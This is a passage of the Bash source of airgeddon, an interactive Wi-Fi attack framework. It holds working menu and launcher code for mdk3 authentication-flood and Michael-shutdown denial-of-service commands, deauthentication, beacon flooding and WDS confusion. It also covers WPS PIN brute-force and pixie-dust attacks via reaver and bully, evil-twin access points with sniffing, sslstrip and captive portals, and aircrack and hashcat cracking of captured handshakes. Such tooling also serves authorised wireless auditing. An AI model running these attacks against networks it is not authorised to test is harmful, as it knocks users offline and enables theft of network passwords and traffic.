	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
}

#Execute Michael Shutdown DoS attack
function exec_michaelshutdown() {

	echo
	language_strings "${language}" 94 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
}

#Validate Mdk3 parameters
function mdk3_deauth_option() {

	echo
	language_strings "${language}" 95 "title"
	language_strings "${language}" 35 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_bssid
	ask_channel
	exec_mdk3deauth
}

#Validate Aireplay parameters
function aireplay_deauth_option() {

	echo
	language_strings "${language}" 96 "title"
	language_strings "${language}" 36 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_bssid
	ask_channel
	exec_aireplaydeauth
}

#Validate WDS confusion parameters
function wds_confusion_option() {

	echo
	language_strings "${language}" 97 "title"
	language_strings "${language}" 37 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_essid
	ask_channel
	exec_wdsconfusion
}

#Validate Beacon flood parameters
function beacon_flood_option() {

	echo
	language_strings "${language}" 98 "title"
	language_strings "${language}" 38 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_essid
	ask_channel
	exec_beaconflood
}

#Validate Auth DoS parameters
function auth_dos_option() {

	echo
	language_strings "${language}" 99 "title"
	language_strings "${language}" 39 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_bssid
	exec_authdos
}

#Validate Michael Shutdown parameters
function michael_shutdown_option() {

	echo
	language_strings "${language}" 100 "title"
	language_strings "${language}" 40 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_bssid
	exec_michaelshutdown
}

#Validate wps custom pin parameters
function wps_custom_pin_parameters() {

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return 1
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_bssid "wps"
	ask_channel "wps"
	ask_custom_pin
	return 0
}

#Validate wps pixie dust and bruteforce parameters
function wps_pixie_dust_and_bruteforce_parameters() {

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return 1
	fi

	echo
	language_strings "${language}" 34 "yellow"

	ask_bssid "wps"
	ask_channel "wps"
	return 0
}

#Print selected interface
function print_iface_selected() {

	if [ -z "${interface}" ]; then
		language_strings "${language}" 41 "blue"
		echo
		language_strings "${language}" 115 "read"
		select_interface
	else
		check_interface_mode
		language_strings "${language}" 42 "blue"
	fi
}

#Print selected internet interface
function print_iface_internet_selected() {

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		if [ -z "${internet_interface}" ]; then
			language_strings "${language}" 283 "blue"
		else
			language_strings "${language}" 282 "blue"
		fi
	fi
}

#Print selected target parameters (bssid, channel, essid and type of encryption)
function print_all_target_vars() {

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
		if [ -n "${channel}" ]; then
			language_strings "${language}" 44 "blue"
		fi
		if [ -n "${essid}" ]; then
			if [ "${essid}" = "(Hidden Network)" ]; then
				language_strings "${language}" 45 "blue"
			else
				language_strings "${language}" 46 "blue"
			fi
		fi
		if [ -n "${enc}" ]; then
			language_strings "${language}" 135 "blue"
		fi
	fi
}

#Print selected target parameters on evil twin menu (bssid, channel and essid)
function print_all_target_vars_et() {

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi
}

#Print selected target parameters on evil twin submenus (bssid, channel, essid, DoS type and Handshake file)
function print_et_target_vars() {

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi

	if [ "${current_menu}" != "et_dos_menu" ]; then
		if [ -n "${et_dos_attack}" ]; then
			language_strings "${language}" 272 "blue"
		else
			language_strings "${language}" 278 "blue"
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ -n "${et_handshake}" ]; then
			language_strings "${language}" 311 "blue"
		else
			if [ -n "${enteredpath}" ]; then
				language_strings "${language}" 314 "blue"
			else
				language_strings "${language}" 310 "blue"
			fi
		fi
	fi
}

#Print selected target parameters on wps attacks menu (bssid, channel and essid)
function print_all_target_vars_wps() {

	if [ -n "${wps_bssid}" ]; then
		language_strings "${language}" 335 "blue"
	else
		language_strings "${language}" 339 "blue"
	fi

	if [ -n "${wps_channel}" ]; then
		language_strings "${language}" 336 "blue"
	else
		language_strings "${language}" 340 "blue"
	fi

	if [ -n "${wps_essid}" ]; then
		if [ "${wps_essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 337 "blue"
		else
			language_strings "${language}" 338 "blue"
		fi
	else
		language_strings "${language}" 341 "blue"
	fi

	if [ -n "${wps_locked}" ]; then
		language_strings "${language}" 351 "blue"
	else
		language_strings "${language}" 352 "blue"
	fi
}

#Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file and rules file)
function print_decrypt_vars() {

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 185 "blue"
	fi

	if [ -n "${enteredpath}" ]; then
		language_strings "${language}" 173 "blue"
	else
		language_strings "${language}" 177 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Create the dependencies arrays
function initialize_menu_options_dependencies() {

	clean_handshake_dependencies=(${optional_tools_names[0]})
	aircrack_attacks_dependencies=(${optional_tools_names[1]})
	aireplay_attack_dependencies=(${optional_tools_names[2]})
	mdk3_attack_dependencies=(${optional_tools_names[3]})
	hashcat_attacks_dependencies=(${optional_tools_names[4]})
	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
	et_sniffing_sslstrip_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]} ${optional_tools_names[10]})
	et_captive_portal_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[11]})
	wash_scan_dependencies=(${optional_tools_names[13]})
	reaver_attacks_dependencies=(${optional_tools_names[14]})
	bully_attacks_dependencies=(${optional_tools_names[15]})
	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]})
	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
}

#Set some vars depending of the menu and invoke the printing of target vars
function initialize_menu_and_print_selections() {

	forbidden_options=()

	case ${current_menu} in
		"main_menu")
			print_iface_selected
		;;
		"decrypt_menu")
			print_decrypt_vars
		;;
		"handshake_tools_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"dos_attacks_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"attack_handshake_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"language_menu")
			print_iface_selected
		;;
		"evil_twin_attacks_menu")
			return_to_et_main_menu=0
			retry_handshake_capture=0
			retrying_handshake_capture=0
			internet_interface_selected=0
			captive_portal_mode="internet"
			et_mode=""
			et_processes=()
			print_iface_selected
			print_all_target_vars_et
		;;
		"et_dos_menu")
			if [ ${retry_handshake_capture} -eq 1 ]; then
				retry_handshake_capture=0
				retrying_handshake_capture=1
			fi
			print_iface_selected
			print_et_target_vars
			print_iface_internet_selected
		;;
		"wps_attacks_menu")
			print_iface_selected
			print_all_target_vars_wps
		;;
		*)
			print_iface_selected
			print_all_target_vars
		;;
	esac
}

#Clean temporary files
function clean_tmpfiles() {

	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts"* > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
	rm -rf -R "${tmpdir}${webdir}" > /dev/null 2>&1
	if [ "${dhcpd_path_changed}" -eq 1 ]; then
		rm -rf "${dhcp_path}" > /dev/null 2>&1
	fi
	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
}

#Clean firewall rules and restore orginal routing state
function clean_routing_rules() {

	if [ -n "${original_routing_state}" ]; then
		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
	fi

	iptables -F
	iptables -t nat -F
	iptables -X
	iptables -t nat -X
}

#Create an array from parameters
function store_array() {

	local values=("${@:3}")
	for i in "${!values[@]}"; do
		eval "${1}[\$2|${i}]=\${values[i]}"
	done
}

#Check if something (first parameter) is inside an array (second parameter)
contains_element() {

	local e
	for e in "${@:2}"; do
		[[ "${e}" = "${1}" ]] && return 0
	done
	return 1
}

#Print hints from the different hint pools depending of the menu
function print_hint() {

	declare -A hints

	case ${1} in
		"main_menu")
			store_array hints main_hints "${main_hints[@]}"
			hintlength=${#main_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[main_hints|${randomhint}]}
		;;
		"dos_attacks_menu")
			store_array hints dos_hints "${dos_hints[@]}"
			hintlength=${#dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[dos_hints|${randomhint}]}
		;;
		"handshake_tools_menu")
			store_array hints handshake_hints "${handshake_hints[@]}"
			hintlength=${#handshake_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[handshake_hints|${randomhint}]}
		;;
		"attack_handshake_menu")
			store_array hints handshake_attack_hints "${handshake_attack_hints[@]}"
			hintlength=${#handshake_attack_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[handshake_attack_hints|${randomhint}]}
		;;
		"decrypt_menu")
			store_array hints decrypt_hints "${decrypt_hints[@]}"
			hintlength=${#decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[decrypt_hints|${randomhint}]}
		;;
		"select_interface_menu")
			store_array hints select_interface_hints "${select_interface_hints[@]}"
			hintlength=${#select_interface_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[select_interface_hints|${randomhint}]}
		;;
		"language_menu")
			store_array hints language_hints "${language_hints[@]}"
			hintlength=${#language_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[language_hints|${randomhint}]}
		;;
		"evil_twin_attacks_menu")
			store_array hints evil_twin_hints "${evil_twin_hints[@]}"
			hintlength=${#evil_twin_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_hints|${randomhint}]}
		;;
		"et_dos_menu")
			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
			hintlength=${#evil_twin_dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_dos_hints|${randomhint}]}
		;;
		"wps_attacks_menu")
			store_array hints wps_hints "${wps_hints[@]}"
			hintlength=${#wps_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wps_hints|${randomhint}]}
		;;
	esac

	print_simple_separator
	language_strings "${language}" "${strtoprint}" "hint"
	print_simple_separator
}

#Airgeddon main menu
function main_menu() {

	clear
	language_strings "${language}" 101 "title"
	current_menu="main_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	print_simple_separator
	language_strings "${language}" 118
	language_strings "${language}" 119
	language_strings "${language}" 169
	language_strings "${language}" 252
	language_strings "${language}" 333
	print_simple_separator
	language_strings "${language}" 60
	language_strings "${language}" 78
	language_strings "${language}" 61
	print_hint ${current_menu}

	read -r main_option
	case ${main_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			dos_attacks_menu
		;;
		5)
			handshake_tools_menu
		;;
		6)
			decrypt_menu
		;;
		7)
			evil_twin_attacks_menu
		;;
		8)
			wps_attacks_menu
		;;
		9)
			credits_option
		;;
		10)
			language_menu
		;;
		11)
			exit_script_option
		;;
		*)
			invalid_menu_option
		;;
	esac

	main_menu
}

#Evil Twin attacks menu
function evil_twin_attacks_menu() {

	clear
	language_strings "${language}" 253 "title"
	current_menu="evil_twin_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 255 "separator"
	language_strings "${language}" 256 et_onlyap_dependencies[@]
	language_strings "${language}" 257 "separator"
	language_strings "${language}" 259 et_sniffing_dependencies[@]
	language_strings "${language}" 261 et_sniffing_sslstrip_dependencies[@]
	language_strings "${language}" 262 "separator"
	language_strings "${language}" 263 et_captive_portal_dependencies[@]
	print_simple_separator
	language_strings "${language}" 260
	print_hint ${current_menu}

	read -r et_option
	case ${et_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			contains_element "${et_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				check_interface_wifi
				if [ "$?" = "0" ]; then
					et_mode="et_onlyap"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			contains_element "${et_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				check_interface_wifi
				if [ "$?" = "0" ]; then
					et_mode="et_sniffing"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			contains_element "${et_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				check_interface_wifi
				if [ "$?" = "0" ]; then
					et_mode="et_sniffing_sslstrip"
					et_dos_menu
				else
					echo
					language_strings "${language}" 281 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			contains_element "${et_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				check_interface_wifi
				if [ "$?" = "0" ]; then
					et_mode="et_captive_portal"
					echo
					language_strings "${language}" 316 "yellow"
					language_strings "${language}" 115 "read"

					explore_for_targets_option
					if [ "$?" = "0" ]; then
						et_dos_menu
					fi
				else
					echo
					language_strings "${language}" 281 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	evil_twin_attacks_menu
}

#WPS attacks menu
function wps_attacks_menu() {

	clear
	language_strings "${language}" 334 "title"
	current_menu="wps_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49 wash_scan_dependencies[@]
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 345 bully_attacks_dependencies[@]
	language_strings "${language}" 357 reaver_attacks_dependencies[@]
	language_strings "${language}" 346 bully_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 358 reaver_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 347 bully_attacks_dependencies[@]
	language_strings "${language}" 359 reaver_attacks_dependencies[@]
	language_strings "${language}" 348 "under_construction" #bully_attacks_dependencies[@]
	language_strings "${language}" 360 "under_construction" #reaver_attacks_dependencies[@]
	print_simple_separator
	language_strings "${language}" 361
	print_hint ${current_menu}

	read -r wps_option
	case ${wps_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_reaver_version
				explore_for_wps_targets_option
			fi
		;;
		5)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_bully_version
				set_bully_verbosity
				wps_custom_pin_parameters
				if [ "$?" = "0" ]; then
					exec_wps_custom_pin_bully_attack
				fi
			fi
		;;
		6)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				wps_custom_pin_parameters
				if [ "$?" = "0" ]; then
					exec_wps_custom_pin_reaver_attack
				fi
			fi
		;;
		7)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_bully_version
				set_bully_verbosity
				validate_bully_pixiewps_version
				if [ "$?" = "0" ]; then
					echo
					language_strings "${language}" 368 "yellow"
					language_strings "${language}" 115 "read"
					wps_pixie_dust_and_bruteforce_parameters
					if [ "$?" = "0" ]; then
						exec_bully_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 367 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_reaver_version
				validate_reaver_pixiewps_version
				if [ "$?" = "0" ]; then
					echo
					language_strings "${language}" 370 "yellow"
					language_strings "${language}" 115 "read"
					wps_pixie_dust_and_bruteforce_parameters
					if [ "$?" = "0" ]; then
						exec_reaver_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 371 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_bully_version
				set_bully_verbosity
				wps_pixie_dust_and_bruteforce_parameters
				if [ "$?" = "0" ]; then
					exec_wps_bruteforce_pin_bully_attack
				fi
			fi
		;;
		10)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_reaver_version
				wps_pixie_dust_and_bruteforce_parameters
				if [ "$?" = "0" ]; then
					exec_wps_bruteforce_pin_reaver_attack
				fi
			fi
		;;
		11)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				under_construction_message
			fi
		;;
		12)
			contains_element "${wps_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				under_construction_message
			fi
		;;
		13)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	wps_attacks_menu
}

#Offline decryption attacks menu
function decrypt_menu() {

	clear
	language_strings "${language}" 170 "title"
	current_menu="decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	language_strings "${language}" 176 "separator"
	language_strings "${language}" 172
	language_strings "${language}" 175 aircrack_attacks_dependencies[@]
	language_strings "${language}" 229 "separator"
	language_strings "${language}" 230 hashcat_attacks_dependencies[@]
	language_strings "${language}" 231 hashcat_attacks_dependencies[@]
	language_strings "${language}" 232 hashcat_attacks_dependencies[@]
	print_simple_separator
	language_strings "${language}" 174
	print_hint ${current_menu}

	read -r decrypt_option
	case ${decrypt_option} in
		1)
			contains_element "${decrypt_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				aircrack_dictionary_attack_option
			fi
		;;
		2)
			contains_element "${decrypt_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				aircrack_bruteforce_attack_option
			fi
		;;
		3)
			contains_element "${decrypt_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_dictionary_attack_option
			fi
		;;
		4)
			contains_element "${decrypt_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_bruteforce_attack_option
			fi
		;;
		5)
			contains_element "${decrypt_option}" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_rulebased_attack_option
			fi
		;;
		6)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	decrypt_menu
}

#Read the user input on rules file questions
function ask_rules() {

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "rules"
	done
	language_strings "${language}" 241 "yellow"
}

#Read the user input on dictionary file questions
function ask_dictionary() {

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "dictionary"
	done
	language_strings "${language}" 181 "yellow"
}

#Read the user input on Handshake file questions
function ask_capture_file() {

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "targetfilefordecrypt"
	done
	language_strings "${language}" 189 "yellow"
}

#Manage the questions on Handshake file questions
function manage_asking_for_captured_file() {

	if [ -n "${enteredpath}" ]; then
		echo
		language_strings "${language}" 186 "blue"
		ask_yesno 187
		if [ ${yesno} = "n" ]; then
			ask_capture_file
		fi
	else
		ask_capture_file
	fi
}

#Manage the questions on dictionary file questions
function manage_asking_for_dictionary_file() {

	if [ -n "${DICTIONARY}" ]; then
		echo
		language_strings "${language}" 183 "blue"
		ask_yesno 184
		if [ ${yesno} = "n" ]; then
			ask_dictionary
		fi
	else
		ask_dictionary
	fi
}

#Manage the questions on rules file questions
function manage_asking_for_rule_file() {

	if [ -n "${RULES}" ]; then
		echo
		language_strings "${language}" 239 "blue"
		ask_yesno 240
		if [ ${yesno} = "n" ]; then
			ask_rules
		fi
	else
		ask_rules
	fi
}

#Validate the file to be cleaned
function check_valid_file_to_clean() {

	nets_from_file=$(echo "1" | aircrack-ng "${1}" 2> /dev/null | egrep "WPA|WEP" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${nets_from_file}" = "" ]; then
		return 1
	fi

	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
		fi
	done

	if [ ${option_counter} -le 1 ]; then
		return 1
	fi

	handshakefilesize=$(wc -c "${filetoclean}" 2> /dev/null | awk -F " " '{print$1}')
	if [ "${handshakefilesize}" -le 1024 ]; then
		return 1
	fi

	echo "1" | aircrack-ng "${1}" 2> /dev/null | egrep "1 handshake" > /dev/null
	if [ "$?" != "0" ]; then
		return 1
	fi

	return 0
}

#Check if a bssid is present on a capture file to know if there is a Handshake with that bssid
function check_bssid_in_captured_file() {

	nets_from_file=$(echo "1" | aircrack-ng "${1}" 2> /dev/null | egrep "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	echo
	if [ "${nets_from_file}" = "" ]; then
		if [ ! -f "${1}" ]; then
			language_strings "${language}" 161 "yellow"
			language_strings "${language}" 115 "read"
		else
			language_strings "${language}" 216 "yellow"
			language_strings "${language}" 115 "read"
		fi
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			language_strings "${language}" 322 "yellow"
			return 0
		fi
	done

	language_strings "${language}" 323 "yellow"
	language_strings "${language}" 115 "read"
	return 1
}

#Set the target vars to a bssid selecting them from a capture file which has a Handshake
function select_wpa_bssid_target_from_captured_file() {

	nets_from_file=$(echo "1" | aircrack-ng "${1}" 2> /dev/null | egrep "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	echo
	if [ "${nets_from_file}" = "" ]; then
		language_strings "${language}" 216 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			language_strings "${language}" 192 "blue"
			ask_yesno 193

			if [ ${yesno} = "y" ]; then
				bssid=${targetbssid}
				return 0
			fi
			break
		fi
	done

	bssid_autoselected=0
	if [ ${option_counter} -gt 1 ]; then
		option_counter=0
		for item in ${nets_from_file}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then

				option_counter=$((option_counter + 1))

				if [ ${option_counter} -lt 10 ]; then
					space=" "
				else
					space=""
				fi

				echo -n "${option_counter}.${space}${item}"
			elif [[ ${item} =~ \)$ ]]; then
				echo -en "${item}\r\n"
			else
				echo -en " ${item} "
			fi
		done
		print_hint ${current_menu}

		target_network_on_file=0
		while [[ ${target_network_on_file} -lt 1 || ${target_network_on_file} -gt ${option_counter} ]]; do
			echo
			language_strings "${language}" 3 "green"
			read -r target_network_on_file
		done

	else
		target_network_on_file=1
		bssid_autoselected=1
	fi

	bssid=${bssids_detected[${target_network_on_file}]}

	if [ ${bssid_autoselected} -eq 1 ]; then
		language_strings "${language}" 217 "blue"
	fi

	return 0
}

#Validate and ask for the different parameters used in an aircrack dictionary based attack
function aircrack_dictionary_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "${enteredpath}"
	if [ "$?" != "0" ]; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_dictionary_attack
}

#Validate and ask for the different parameters used in an aircrack bruteforce based attack
function aircrack_bruteforce_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "${enteredpath}"
	if [ "$?" != "0" ]; then
		return
	fi

	set_minlength_and_maxlength

	charset_option=0
	while [[ ${charset_option} -lt 1 || ${charset_option} -gt 11 ]]; do
		set_charset "aircrack"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_bruteforce_attack
}

#Validate and ask for the different parameters used in a hashcat dictionary based attack
function hashcat_dictionary_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "${enteredpath}"
	if [ "$?" != "0" ]; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_dictionary_attack
	manage_hashcat_pot
}

#Validate and ask for the different parameters used in a hashcat bruteforce based attack
function hashcat_bruteforce_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "${enteredpath}"
	if [ "$?" != "0" ]; then
		return
	fi

	set_minlength_and_maxlength

	charset_option=0
	while [[ ${charset_option} -lt 1 || ${charset_option} -gt 5 ]]; do
		set_charset "hashcat"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_bruteforce_attack
	manage_hashcat_pot
}

#Validate and ask for the different parameters used in a hashcat rule based attack
function hashcat_rulebased_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "${enteredpath}"
	if [ "$?" != "0" ]; then
		return
	fi

	manage_asking_for_dictionary_file

	manage_asking_for_rule_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_rulebased_attack
